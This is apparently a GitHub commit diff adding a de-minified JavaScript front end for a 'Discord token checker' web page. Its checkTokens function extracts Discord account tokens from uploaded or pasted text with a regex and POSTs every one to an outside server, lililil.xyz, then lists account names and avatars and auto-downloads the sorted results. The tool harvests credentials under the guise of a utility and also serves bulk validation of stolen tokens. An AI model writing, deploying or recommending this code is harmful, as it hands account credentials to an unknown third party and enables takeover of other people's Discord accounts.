44e4c711bb7e863ad02bc9cade5dba83df9c165a
discord-token-checker <104864128+discord-token-checker@users.noreply.github.com>
2022-05-04 17:37:26 +0500

    Add files via upload

--- assets/app.js
+++ assets/app.js
@@ -1,1 +1,115 @@
-function readFile(){let e=document.getElementById("file").files[0];if(e){let t=new FileReader;t.readAsText(e,"UTF-8"),t.onload=function(e){checkTokens(e.target.result)},t.onerror=function(e){console.log(e)}}}function checkTokens(e){e||(e=document.getElementById("tokens").value);let t=[...new Set([...JSON.stringify(e).matchAll(/(mfa\.[\w_\-]{84})|([\w]{24}\.[\w_\-]{6}\.[\w_\-]{27})/g)].map(e=>e.slice(1)).flat(1/0).filter(Boolean))];if(0===t.length)return alert("Tokens not found!");document.getElementById("results").classList.remove("hide"),document.getElementById("tokens_list").classList.add("hide"),document.getElementById("results").classList.add("results"),document.getElementById("tokens_list").classList.remove("input_tokens");let n=new XMLHttpRequest;n.open("POST","https://lililil.xyz/checker",!0),n.setRequestHeader("Content-type","application/json"),n.responseType="json",n.onload=function(){if(200!==n.status)return document.getElementById("results").classList.add("hide"),document.getElementById("tokens_list").classList.remove("hide"),document.getElementById("results").classList.remove("results"),document.getElementById("tokens_list").classList.add("input_tokens"),alert(n.response);for(let e of Object.keys(n.response.tokensData))if("invalid"===n.response.tokensData[e].status)document.getElementById("invalid_tokens").innerHTML+=`<div class="account">\n                        <div class="box">\n                            <img src="./assets/Default.png" alt="User Avatar">\n                        </div>\n                        <div class="box">\n                            <span>XXXXX#0000</span>\n                            <p>${e}</p>\n                        </div>\n                    </div>`;else{let t=`${n.response.tokensData[e].me.username}#${n.response.tokensData[e].me.discriminator}`,s=n.response.tokensData[e].me.id,o=n.response.tokensData[e].me.avatar,a=`https://cdn.discordapp.com/avatars/${s}/${n.response.tokensData[e].me.avatar}`;null===o&&(a="./assets/Default.png"),"valid"===n.response.tokensData[e].status?document.getElementById("valid_tokens").innerHTML+=`<div class="account">\n                    <div class="box">\n                        <img src="${a}" alt="User Avatar">\n                    </div>\n                    <div class="box">\n                        <span>${t}</span>\n                        <p>${e}</p>\n                    </div>\n                </div>`:document.getElementById("unverified_tokens").innerHTML+=`<div class="account">\n                    <div class="box">\n                        <img src="${a}" alt="User Avatar">\n                    </div>\n                    <div class="box">\n                        <span>${t}</span>\n                        <p>${e}</p>\n                    </div>\n                </div>`}for(let e of Object.keys(n.response.tokensInfo))0!==n.response.tokensInfo[e].length&&download(e,n.response.tokensInfo[e].join("\n"));download("json_output.json",JSON.stringify(n.response,null,"\t"))},n.send(JSON.stringify({parsedTokens:t}))}function download(e,t){let n=document.createElement("a");if(n.setAttribute("href","data:text/plain;charset=utf-8,"+encodeURIComponent(t)),n.setAttribute("download",e),document.createEvent){let e=document.createEvent("MouseEvents");e.initEvent("click",!0,!0),n.dispatchEvent(e)}else n.click()}
+function readFile() {
+    let file = document.getElementById("file").files[0];
+    if (file) {
+        let reader = new FileReader();
+        reader.readAsText(file, "UTF-8");
+        reader.onload = function (evt) {
+           checkTokens(evt.target.result)
+        }
+        reader.onerror = function (evt) {
+            console.log(evt)
+        }
+    }
+}
+
+function checkTokens(input) {
+    if(!input) {
+        input = document.getElementById("tokens").value
+    }
+
+    let parsedTokens = [...new Set([...JSON.stringify(input)
+        .matchAll(/(mfa\.[\w_\-]{84})|([\w]{24}\.[\w_\-]{6}\.[\w_\-]{27})/g)]
+        .map(m => m.slice(1)).flat(Infinity)
+        .filter(Boolean)
+    )]
+
+    if (parsedTokens.length === 0 || parsedTokens.length > 1000) {
+        return alert("Tokens not found!")
+    }
+
+    document.getElementById("results").classList.remove("hide")
+    document.getElementById("tokens_list").classList.add("hide")
+    document.getElementById("results").classList.add("results")
+    document.getElementById("tokens_list").classList.remove("input_tokens")
+
+
+    let xhr = new XMLHttpRequest()
+    xhr.open('POST', 'https://lililil.xyz/checker', true)
+    xhr.setRequestHeader('Content-type', 'application/json')
+    xhr.responseType = 'json'
+
+    xhr.onload = function () {
+        if (xhr.status !== 200) {
+            document.getElementById("results").classList.add("hide")
+            document.getElementById("tokens_list").classList.remove("hide")
+            document.getElementById("results").classList.remove("results")
+            document.getElementById("tokens_list").classList.add("input_tokens")
+            return alert(xhr.response)
+        }
+
+        for (let token of Object.keys(xhr.response.tokensData)) {
+            if (xhr.response.tokensData[token].status === "invalid") {
+                document.getElementById("invalid_tokens").innerHTML +=
+                    `<div class="account">
+                        <div class="box">
+                            <img src="./assets/Default.png" alt="User Avatar">
+                        </div>
+                        <div class="box">
+                            <span>XXXXX#0000</span>
+                            <p>${token}</p>
+                        </div>
+                    </div>`
+            } else {
+                let username = `${xhr.response.tokensData[token].me.username}#${xhr.response.tokensData[token].me.discriminator}`
+                let id = xhr.response.tokensData[token].me.id
+                let avatarId = xhr.response.tokensData[token].me.avatar
+                let avatar = `https://cdn.discordapp.com/avatars/${id}/${xhr.response.tokensData[token].me.avatar}`
+                if (avatarId === null) avatar = "./assets/Default.png"
+
+                if (xhr.response.tokensData[token].status === "valid") {
+                    document.getElementById("valid_tokens").innerHTML +=
+                        `<div class="account">
+                    <div class="box">
+                        <img src="${avatar}" alt="User Avatar">
+                    </div>
+                    <div class="box">
+                        <span>${username}</span>
+                        <p>${token}</p>
+                    </div>
+                </div>`
+                } else {
+                    document.getElementById("unverified_tokens").innerHTML +=
+                        `<div class="account">
+                    <div class="box">
+                        <img src="${avatar}" alt="User Avatar">
+                    </div>
+                    <div class="box">
+                        <span>${username}</span>
+                        <p>${token}</p>
+                    </div>
+                </div>`
+                }
+            }
+        }
+        for(let tokenType of Object.keys(xhr.response.tokensInfo)) {
+            if(xhr.response.tokensInfo[tokenType].length === 0) continue
+            download(tokenType, xhr.response.tokensInfo[tokenType].join("\n"))
+        }
+        download("json_output.json", JSON.stringify(xhr.response, null, "\t"))
+    }
+    xhr.send(JSON.stringify({parsedTokens}))
+}
+
+function download(filename, text) {
+    let pom = document.createElement('a');
+    pom.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
+    pom.setAttribute('download', filename);
+
+    if (document.createEvent) {
+        let event = document.createEvent('MouseEvents');
+        event.initEvent('click', true, true);
+        pom.dispatchEvent(event);
+    } else {
+        pom.click();
+    }
+}
